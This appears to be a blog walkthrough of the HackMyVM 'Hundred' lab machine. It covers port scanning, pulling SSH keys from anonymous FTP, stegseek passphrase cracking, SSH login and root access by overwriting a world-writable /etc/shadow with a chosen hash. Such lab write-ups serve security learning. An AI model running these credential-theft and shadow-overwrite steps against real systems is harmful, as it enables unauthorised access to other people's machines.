---
layout: post
title: "HackMyVM - Hundred"
date: 2021-08-08 15:47:00 +0100
categories: hmv
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: easy
Release Date: 2021-08-03

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.146
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-08 22:32 WEST
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 22:32 (0:00:03 remaining)
Nmap scan report for 192.168.1.146
Host is up (0.00030s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 0        0             435 Aug 02  2021 id_rsa [NSE: writeable]
| -rwxrwxrwx    1 1000     1000         1679 Aug 02  2021 id_rsa.pem [NSE: writeable]
| -rwxrwxrwx    1 1000     1000          451 Aug 02  2021 id_rsa.pub [NSE: writeable]
|_-rwxrwxrwx    1 0        0             187 Aug 02  2021 users.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:28:1f:2a:1a:56:49:9d:77:88:4f:c4:74:56:0f:5c (RSA)
|   256 1d:8d:a0:2e:e9:a3:2d:a1:4d:ec:07:41:75:ce:47:0e (ECDSA)
|_  256 06:80:3b:fc:c5:f7:7d:c5:58:26:83:c4:f7:7e:a3:d9 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
```

## Enumeration

```bash
$ ls
id_rsa  id_rsa.pem  id_rsa.pub  README.md  users.txt

$ ls -la 
total 28
drwxr-xr-x  2 adok adok 4096 May 25 22:42 .
drwxr-xr-x 31 adok adok 4096 May 25 22:31 ..
-rw-r--r--  1 adok adok  435 Aug  2  2021 id_rsa
-rw-r--r--  1 adok adok 1679 Aug  2  2021 id_rsa.pem
-rw-r--r--  1 adok adok  451 Aug  2  2021 id_rsa.pub
-rw-r--r--  1 adok adok 2198 May 25 22:40 README.md
-rw-r--r--  1 adok adok  187 Aug  2  2021 users.txt

$ cat users.txt                    
--- SNIP ---
noname
roelvb
ch4rm
marcioapm
isen
sys7em
chicko
tasiyanci
luken
alienum
linked
tatayoyo
0xr0n1n
exploiter
kanek180
cromiphi
softyhack
b4el7d
val1d
--- SNIP ---

Thanks!
hmv

$ cat id_rsa.pub
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwsrHORyA+mG6HS9ZmZwz
[REDACTED]
nP6DAVnbReDDbhNLcnfVXEkBv8SQL7OFIiKxJpoa1ADqGffA5LOPFdYKbbCFMict
QQIDAQAB
-----END PUBLIC KEY-----

$ cat id_rsa.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwsrHORyA+mG6HS9ZmZwzPmKHrHhA0/kKCwNjUG8rmPVupv73
mUsewpoGvYB9L9I7pUAsMscAb5MVo89d4b0z2RnXDD1fh6mKlTJmcNwWCnA1PgD+
[REDACTED]
wiWWDjni1ILVSfWIR4/nvosJPa+39WDv+dFt3bJdcUA3SL2acW3MGVPC6abZWwSo
izXrZm8h0ZSuXyU/uuT3BCJt77HyN2cPZrqccPwanS9du6zrX0u2yQ==
-----END RSA PRIVATE KEY-----

$ cat id_rsa    
  / \
    / _ \
   | / \ |
   ||   || _______
   ||   || |\     \
   ||   || ||\     \
   ||   || || \    |
   ||   || ||  \__/
   ||   || ||   ||
    \\_/ \_/ \_//
   /   _     _   \
  /               \
  |    O     O    |
  |   \  ___  /   |                           
 /     \ \_/ /     \
/  -----  |  --\    \
|     \__/|\__/ \   |
\       |_|_|       /
 \_____       _____/
       \     /
       |     |
-------------------------
```

### Page Source

```html
<style> .center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  key: h4ckb1tu5.enc;
  width: 50%;
} </style> <img src="[logo.jpg](view-source:http://192.168.1.146/logo.jpg)" class="center"> <h1>Thank you ALL!</h1> <h1>100 f*cking VMs!!</h1> <!-- l4nr3n, nice dir.-->
```

```bash
$ curl -O "http://192.168.1.146/{h4ckb1tu5.enc,logo.jpg}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   256  100   256    0     0  43507      0 --:--:-- --:--:-- --:--:-- 51200
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  7277  100  7277    0     0  5538k      0 --:--:-- --:--:-- --:--:-- 7106k

$ openssl rsautl -decrypt -inkey id_rsa.pem -in h4ckb1tu5.enc
/softyhackb4el7dshelldredd
```

### Enumerate Directories with DirSearch

```bash
$ dirsearch -r -u http://192.168.1.146/softyhackb4el7dshelldredd -w /usr/share/seclists/Discovery/Web-Content/common.txt -f -e txt,php,html,htm,zip

  _|. _ _  _  _  _ _|_    v0.4.2.4
 (_||| _) (/_(_|| (_| )

Extensions: txt, php, html, htm, zip | HTTP method: GET | Threads: 25 | Wordlist size: 32511

Target: http://192.168.1.146/softyhackb4el7dshelldredd/

[22:56:14] Starting: 
[22:57:25] 200 -    2KB - /softyhackb4el7dshelldredd/id_rsa                 
[22:57:27] 200 -   26B  - /softyhackb4el7dshelldredd/index.html             
                                                                             
Task Completed
```

### Download ir_rsa + Decrypt

```bash
$ wget http://172.16.1.108/softyhackb4el7dshelldredd/id_rsa && cat id_rsa

$ stegseek logo.jpg users.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "cromiphi"
[i] Original filename: "toyou.txt".
[i] Extracting to "logo.jpg.out".

$ cat logo.jpg.out 
d4t4s3c#1

$ chmod 600 id_rsa
```

### SSH 

```bash
$ ssh -i id_rsa hmv@192.168.1.146
Enter passphrase for key 'id_rsa': 
Linux hundred 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Last login: Mon Aug  2 06:43:27 2021 from 192.168.1.51
hmv@hundred:~$ 
```

## ROOT - [shadow file](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)

```bash
hmv@hundred:~$ ls -la /etc/shadow
-rwxrwx-wx 1 root shadow 963 Aug  2  2021 /etc/shadow
```

```bash
hmv@hundred:~$ openssl passwd
Password: 
Verifying - Password: 
Y0KoTY2fpDma6

ad0k1234
```

```bash
hmv@hundred:~$ echo root:Y0KoTY2fpDma6:18844:0:99999:7::: > /etc/shadow
hmv@hundred:~$ su -l
Password: 
root@hundred:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hundred:~# 
```